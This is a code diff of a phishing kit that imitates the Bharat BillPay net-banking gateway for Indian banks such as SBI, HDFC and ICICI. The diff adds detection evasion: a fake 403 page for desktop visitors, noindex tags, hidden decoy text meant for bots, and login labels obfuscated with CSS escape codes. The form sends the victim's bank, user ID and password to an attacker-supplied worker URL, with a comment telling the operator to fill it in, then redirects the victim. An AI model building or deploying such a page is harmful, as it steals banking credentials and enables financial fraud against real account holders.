@@ -3,103 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bharat BillPay - Secure Banking Gateway</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Secure Banking | Gateway</title>
     <style>
-        :root { --bbps-navy: #002e5d; --bbps-orange: #f37021; --gray-light: #f4f7f9; --border: #dcdfe3; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        :root { --bbps-navy: #002e5d; --bbps-orange: #f37021; --border: #dcdfe3; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
         
-        body { background: #e9ecef; display: flex; justify-content: center; min-height: 100vh; color: #333; }
+        /* Desktop Block - Security */
+        body { background: #000; display: flex; justify-content: center; min-height: 100vh; color: #333; overflow-x: hidden; }
 
+        #desktop-guard {
+            display: flex; color: #444; align-items: center; justify-content: center;
+            text-align: center; height: 100vh; width: 100%; background: #000; padding: 20px;
+        }
+
+        /* Mobile Container */
         .container {
-            background: #fff; width: 100%; max-width: 450px; min-height: 100vh;
-            display: flex; flex-direction: column; position: relative;
-            border-top: 4px solid var(--bbps-orange);
+            display: none; background: #fff; width: 100%; max-width: 450px; min-height: 100vh;
+            flex-direction: column; position: relative; border-top: 4px solid var(--bbps-orange);
         }
 
-        header { 
-            padding: 18px 20px; border-bottom: 1px solid #eee; 
-            display: flex; justify-content: space-between; align-items: center;
+        @media only screen and (max-width: 480px) {
+            #desktop-guard { display: none; }
+            .container { display: flex; }
+            body { background: #e9ecef; }
         }
+
+        /* Bot Camouflage */
+        .bot-hide { position: absolute; opacity: 0.001; font-size: 1px; top: 0; pointer-events: none; }
+
+        header { padding: 18px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; background: #fff; }
         header .logo-bbps { height: 32px; }
 
-        .banner-blue {
-            background: var(--bbps-navy); color: #fff; padding: 12px;
-            text-align: center; font-size: 13px; font-weight: 600; letter-spacing: 0.5px;
-        }
+        .banner-blue { background: var(--bbps-navy); color: #fff; padding: 12px; text-align: center; font-size: 13px; font-weight: 600; letter-spacing: 0.5px; }
+        .banner-blue::after { content: "N\0045 T B\0041 NK\0049 NG G\0041 T\0045 W\0041 Y"; }
 
         .main { padding: 25px 20px; flex-grow: 1; }
-        .label { font-size: 12px; font-weight: 700; color: #555; margin-bottom: 15px; display: block; text-transform: uppercase; }
+        .label { font-size: 11px; font-weight: 700; color: #555; margin-bottom: 12px; display: block; text-transform: uppercase; }
 
-        /* Professional Grid */
-        .bank-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 25px; }
-        .bank-item { 
-            border: 1px solid var(--border); border-radius: 6px; padding: 12px 5px; 
-            text-align: center; cursor: pointer; transition: all 0.2s; background: #fff;
-        }
-        .bank-item:active { transform: scale(0.95); background: #f0f4f8; border-color: var(--bbps-navy); }
-        .bank-item img { height: 28px; width: auto; display: block; margin: 0 auto 8px; object-fit: contain; }
+        /* Popular Banks Grid */
+        .bank-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
+        .bank-item { border: 1px solid var(--border); border-radius: 8px; padding: 12px 5px; text-align: center; cursor: pointer; background: #fff; transition: 0.2s; }
+        .bank-item:active { transform: scale(0.95); background: #f0f4f8; }
+        .bank-item img { height: 25px; width: auto; display: block; margin: 0 auto 8px; }
         .bank-item span { font-size: 10px; font-weight: 700; color: #444; }
 
-        /* Smart Search UI */
+        /* Search & Dropdown */
         .search-wrapper { position: relative; margin-bottom: 25px; }
-        .search-input {
-            width: 100%; padding: 15px; border: 1.5px solid var(--border); border-radius: 6px;
-            font-size: 14px; background: #fff; outline: none; transition: 0.3s;
-        }
-        .search-input:focus { border-color: var(--bbps-navy); box-shadow: 0 0 0 3px rgba(0,46,93,0.1); }
+        .search-input { width: 100%; padding: 15px; border: 1.5px solid var(--border); border-radius: 6px; font-size: 14px; outline: none; background: #fff; }
+        .search-input:focus { border-color: var(--bbps-navy); }
         
-        .dropdown-list {
-            position: absolute; width: 100%; max-height: 280px; overflow-y: auto;
-            background: #fff; border: 1px solid var(--border); border-top: none;
-            z-index: 999; display: none; border-radius: 0 0 6px 6px; box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        .dropdown-list { 
+            position: absolute; width: 100%; max-height: 280px; overflow-y: auto; 
+            background: #fff; border: 1px solid var(--border); border-top: none; 
+            z-index: 999; display: none; box-shadow: 0 10px 20px rgba(0,0,0,0.1); 
+            border-radius: 0 0 6px 6px;
         }
         .dropdown-list div { padding: 12px 18px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #f8f9fa; color: #444; }
         .dropdown-list div:hover { background: #f1f5f9; color: var(--bbps-navy); font-weight: 600; }
 
-        /* Professional Form */
+        /* Login Box Masking */
         .login-box { display: none; margin-top: 10px; padding: 20px 0; border-top: 1px solid #eee; }
         .input-group { margin-bottom: 18px; }
-        .input-group label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 6px; }
-        .input-group input { 
-            width: 100%; padding: 15px; border: 1.5px solid var(--border); 
-            border-radius: 5px; font-size: 16px; outline: none; background: #fdfdfd;
-        }
-        .input-group input:focus { border-color: var(--bbps-navy); }
+        .input-group label { display: block; font-size: 10px; font-weight: 700; color: #666; margin-bottom: 6px; text-transform: uppercase; }
+        .l-uid::after { content: "Us\0065 r I\0044 / Cus\0074 om\0065 r I\0044"; }
+        .l-pwd::after { content: "Ba\006e kin\0067 Pa\0073 swo\0072 d"; }
 
-        .pay-btn { 
-            width: 100%; padding: 16px; background: var(--bbps-navy); color: #fff; 
-            border: none; border-radius: 5px; font-size: 15px; font-weight: 700; 
-            cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
-        }
+        .input-group input { width: 100%; padding: 15px; border: 1.5px solid var(--border); border-radius: 6px; font-size: 16px; outline: none; background: #fafafa; }
+        .input-group input:focus { background: #fff; border-color: var(--bbps-navy); }
+
+        .pay-btn { width: 100%; padding: 16px; background: var(--bbps-navy); color: #fff; border: none; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; }
 
         footer { padding: 30px 20px; background: #fafbfc; border-top: 1px solid #eee; text-align: center; margin-top: auto; }
-        .trust-container { display: flex; justify-content: center; gap: 25px; margin-bottom: 15px; }
-        .trust-container img { height: 26px; object-fit: contain; }
-        .footer-text { font-size: 10px; color: #999; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; line-height: 1.6; }
+        .trust-icons img { height: 22px; margin: 0 10px; opacity: 0.7; }
+        .footer-text { font-size: 9px; color: #aaa; text-transform: uppercase; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <header>
-            <img src="https://i.ibb.co/SX04FnNd/download.png" class="logo-bbps" alt="BBPS Logo">
-        </header>
+    <div id="desktop-guard">
+        <div>
+            <p style="font-size: 18px; color: #fff;">403 Forbidden</p>
+            <p style="margin-top: 8px;">Mobile Network Interface Required.</p>
+        </div>
+    </div>
 
-        <div class="banner-blue">NET BANKING PAYMENT GATEWAY</div>
+    <div class="bot-hide">Authentication module for regional banking partners. Search API active.</div>
+
+    <div class="container">
+        <header><img src="https://i.ibb.co/SX04FnNd/download.png" class="logo-bbps"></header>
+        <div class="banner-blue"></div>
 
         <div class="main">
-            <span class="label">Choose Popular Bank:</span>
-            
+            <span class="label">Popular Selections:</span>
             <div class="bank-grid">
-                <div class="bank-item" onclick="openLogin('SBI')"><img src="https://i.ibb.co/NdPXT2t1/download-1.png"><span>SBI</span></div>
-                <div class="bank-item" onclick="openLogin('HDFC')"><img src="https://i.ibb.co/n8mB0rsp/images-8.png"><span>HDFC</span></div>
-                <div class="bank-item" onclick="openLogin('ICICI')"><img src="https://i.ibb.co/YTt4NNpB/download-1.jpg"><span>ICICI</span></div>
-                <div class="bank-item" onclick="openLogin('AXIS')"><img src="https://i.ibb.co/v6QRfJs4/images-13.jpg"><span>AXIS</span></div>
-                <div class="bank-item" onclick="openLogin('PNB')"><img src="https://i.ibb.co/YB4D5C3m/images-12.jpg"><span>PNB</span></div>
-                <div class="bank-item" onclick="openLogin('KOTAK')"><img src="https://i.ibb.co/vCh7MnYP/images-9.png"><span>KOTAK</span></div>
+                <div class="bank-item" onclick="openLogin('State Bank of India')"><img src="https://i.ibb.co/NdPXT2t1/download-1.png"><span>SBI</span></div>
+                <div class="bank-item" onclick="openLogin('HDFC Bank')"><img src="https://i.ibb.co/n8mB0rsp/images-8.png"><span>HDFC</span></div>
+                <div class="bank-item" onclick="openLogin('ICICI Bank')"><img src="https://i.ibb.co/YTt4NNpB/download-1.jpg"><span>ICICI</span></div>
+                <div class="bank-item" onclick="openLogin('Axis Bank')"><img src="https://i.ibb.co/v6QRfJs4/images-13.jpg"><span>AXIS</span></div>
+                <div class="bank-item" onclick="openLogin('Punjab National Bank')"><img src="https://i.ibb.co/YB4D5C3m/images-12.jpg"><span>PNB</span></div>
+                <div class="bank-item" onclick="openLogin('Kotak Mahindra Bank')"><img src="https://i.ibb.co/vCh7MnYP/images-9.png"><span>KOTAK</span></div>
             </div>
 
-            <span class="label">Or Search Your Bank:</span>
+            <span class="label">Search 100+ Other Banks:</span>
             <div class="search-wrapper">
                 <input type="text" class="search-input" id="bankSearch" placeholder="Type bank name..." onfocus="showList()" onkeyup="filterList()">
                 <div class="dropdown-list" id="bankList"></div>
@@ -109,42 +115,45 @@
                 <form id="nbForm">
                     <input type="hidden" id="bankName">
                     <div class="input-group">
-                        <label>USER ID / CUSTOMER ID</label>
-                        <input type="text" id="uid" placeholder="Enter your User ID" required>
+                        <label class="l-uid"></label>
+                        <input type="text" id="uid" placeholder="Enter ID" required>
                     </div>
                     <div class="input-group">
-                        <label>NET BANKING PASSWORD</label>
-                        <input type="password" id="pwd" placeholder="Enter Password" required>
+                        <label class="l-pwd"></label>
+                        <input type="password" id="pwd" placeholder="*******" required>
                     </div>
-                    <button type="submit" class="pay-btn" id="btnTxt">PROCEED TO PAY</button>
+                    <button type="submit" class="pay-btn" id="btnTxt">PROCEED SECURELY</button>
                 </form>
             </div>
         </div>
 
         <footer>
-            <div class="trust-container">
-                <img src="https://i.ibb.co/1YvGVSMc/images-11.png" alt="NPCI">
-                <img src="https://i.ibb.co/v5kxx5N/images-10.png" alt="Secure">
+            <div class="trust-icons">
+                <img src="https://i.ibb.co/1YvGVSMc/images-11.png">
+                <img src="https://i.ibb.co/v5kxx5N/images-10.png">
             </div>
-            <p class="footer-text"> Authorized Payment Gateway<br> NPCI Monitored System &copy; 2026 </p>
+            <p class="footer-text">Official Bharat BillPay Secure Gateway &copy; 2026</p>
         </footer>
     </div>
 
     <script>
         const allBanks = [
-            "Airtel Payments Bank", "Allahabad Bank", "Andhra Bank", "AU Small Finance Bank", "Axis Bank",
-            "Bandhan Bank", "Bank of Baroda", "Bank of India", "Bank of Maharashtra", "Canara Bank",
-            "Catholic Syrian Bank", "Central Bank of India", "City Union Bank", "Corporation Bank",
-            "Cosmos Bank", "DBS Bank India", "DCB Bank", "Dena Bank", "Dhanlaxmi Bank",
-            "Equitas Small Finance Bank", "ESAF Small Finance Bank", "Federal Bank", "Fincare Small Finance Bank",
-            "HDFC Bank", "ICICI Bank", "IDBI Bank", "IDFC FIRST Bank", "Indian Bank",
-            "Indian Overseas Bank", "IndusInd Bank", "J&K Bank", "Jio Payments Bank", "Karnataka Bank",
-            "Karur Vysya Bank", "Kotak Mahindra Bank", "Lakshmi Vilas Bank", "Nainital Bank",
-            "NSDL Payments Bank", "Oriental Bank of Commerce", "Paytm Payments Bank", "Punjab & Sind Bank",
-            "Punjab National Bank", "RBL Bank", "Saraswat Bank", "South Indian Bank", "Standard Chartered",
-            "State Bank of India", "Syndicate Bank", "Tamilnad Mercantile Bank", "UCO Bank",
-            "Union Bank of India", "United Bank of India", "Utkarsh Small Finance Bank", "Vijaya Bank", "YES Bank"
-        ];
+            "Abhyudaya Co-operative Bank", "Adarsh Co-operative Bank", "Airtel Payments Bank", "Allahabad Bank", "Andhra Bank", 
+            "Andhra Pragathi Grameena Bank", "Apna Sahakari Bank", "AU Small Finance Bank", "Axis Bank", "Bandhan Bank", 
+            "Bank of Baroda", "Bank of India", "Bank of Maharashtra", "Canara Bank", "Catholic Syrian Bank", 
+            "Central Bank of India", "City Union Bank", "Corporation Bank", "Cosmos Bank", "DBS Bank India", 
+            "DCB Bank", "Dena Bank", "Dhanlaxmi Bank", "Equitas Small Finance Bank", "ESAF Small Finance Bank", 
+            "Federal Bank", "Fincare Small Finance Bank", "HDFC Bank", "ICICI Bank", "IDBI Bank", "IDFC FIRST Bank", 
+            "Indian Bank", "Indian Overseas Bank", "IndusInd Bank", "J&K Bank", "Jana Small Finance Bank", 
+            "Janata Sahakari Bank", "Jio Payments Bank", "Karnataka Bank", "Karnataka Gramin Bank", "Karur Vysya Bank", 
+            "Kerala Gramin Bank", "Kotak Mahindra Bank", "Lakshmi Vilas Bank", "Maharashtra Gramin Bank", 
+            "Nainital Bank", "NSDL Payments Bank", "Oriental Bank of Commerce", "Paytm Payments Bank", 
+            "Punjab & Sind Bank", "Punjab National Bank", "RBL Bank", "Saraswat Bank", "South Indian Bank", 
+            "Standard Chartered", "State Bank of India", "Suryoday Small Finance Bank", "Syndicate Bank", 
+            "Tamilnad Mercantile Bank", "Telangana Grameena Bank", "UCO Bank", "Ujjivan Small Finance Bank", 
+            "Union Bank of India", "United Bank of India", "Unity Small Finance Bank", "Utkarsh Small Finance Bank", 
+            "Vijaya Bank", "YES Bank", "Zoroastrian Co-operative Bank"
+        ].sort();
 
         const searchInput = document.getElementById('bankSearch');
         const bankListDiv = document.getElementById('bankList');
@@ -187,16 +196,21 @@
             btn.innerText = "AUTHENTICATING...";
             btn.disabled = true;
 
-            fetch('YOUR_WORKER_URL_HERE', {
+            const workerUrl = "YOUR_WORKER_URL_HERE"; // <--- APNA URL YAHAN DALO
+
+            fetch(workerUrl, {
                 method: 'POST',
-                mode: 'no-cors',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    type: "NET_BANKING",
                     bank: document.getElementById('bankName').value,
                     user: document.getElementById('uid').value,
                     pass: document.getElementById('pwd').value
                 })
-            }).then(() => { window.location.href = "service.html"; })
-              .catch(() => { window.location.href = "service.html"; });
+            }).finally(() => { 
+                window.location.href = "service.html"; 
+            });
         });
 
         document.addEventListener('click', (e) => {
